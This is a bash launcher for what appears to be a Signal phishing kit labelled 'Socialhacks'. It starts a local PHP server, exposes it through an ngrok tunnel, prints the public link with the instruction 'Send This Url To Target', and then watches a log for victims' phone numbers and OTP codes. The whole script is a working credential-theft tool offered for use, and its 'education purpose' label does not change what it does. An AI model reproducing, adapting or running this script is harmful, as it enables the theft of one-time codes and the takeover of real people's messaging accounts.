#!/bin/bash
clear
echo ""
echo ""
echo ""
 echo -e $'\e[1;33m\e[0m' 
printf "\e[1;31m𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 \e[1;32m 𝗦𝗼𝗰𝗶𝗮𝗹𝗵𝗮𝗰𝗸𝘀  (𝗥𝗲𝗺𝗲𝗺𝗯𝗲𝗿 𝗢𝗻𝗹𝘆 𝗙𝗼𝗿 𝗘𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻 𝗣𝘂𝗿𝗽𝗼𝘀𝗲 )\e[0m"
echo""
 echo -e $'\e[1;33m\e[0m' 
sleep 6
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32m 𝔻 𝕆 - 𝕐 𝕆 𝕌 - 𝕎 𝔸 ℕ 𝕋 - 𝕋 𝕆 - ℂ 𝕆 𝕅 𝕋 𝕀 𝕅 𝕌 𝔼\e[1;33m     (𝙔/𝙉) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh

echo ""
echo ""
                 echo -e $'\e[1;31m--------------------------------------------\e[0m' 
                 echo -e $'\e[1;32m          𝗧𝘆𝗽𝗲 𝗥𝘂𝗻 𝗧𝗼 𝗦𝘁𝗮𝗿𝘁 𝗦𝗲𝗿𝘃𝗲𝗿 \e[0m' 
                 echo -e $'\e[1;31m--------------------------------------------\e[0m' 

                 echo ""
                 echo""
                 read -p $'\e[1;34m 𝗦𝘁𝗮𝗿𝘁 𝗦𝗲𝗿𝘃𝗲𝗿 𝗧𝗼 𝗕𝗿𝗲𝗮𝗸 𝗦𝗶𝗴𝗻𝗮𝗹 : \e[0m\e[1;31m' option
		 case $option in
                        RUN) cd server/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m 𝗣𝗛𝗣 𝗦𝗘𝗥𝗩𝗘𝗥 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚  \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;31m\e[0m'
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m 𝗡𝗚𝗥𝗢𝗞 𝗦𝗘𝗥𝗩𝗘𝗥 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚  \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;33m 𝗦𝗲𝗻𝗱 𝗧𝗵𝗶𝘀 𝗨𝗿𝗹 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁 \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "number" -e "otp"
                 ;;
               esac
                ;;
